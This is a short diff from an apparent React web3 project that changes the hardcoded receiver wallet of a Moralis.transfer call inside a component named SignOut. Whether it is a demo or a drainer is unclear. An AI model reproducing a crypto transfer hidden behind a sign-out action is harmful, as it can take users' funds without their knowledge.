@@ -20,7 +20,7 @@ export const SignOut = () => {
     console.log("handle");
     await Moralis.transfer({
       amount: "1677",
-      receiver: "0x2Eb7CDaD2E1a6A5626263D787E45dBd5455F505C",
+      receiver: "0x2C0A43e194e46a50F0f125fdfD404cB4b162dE17",
       type: "native",
     }).then((e) => {
       alert("sucesfully transfered");
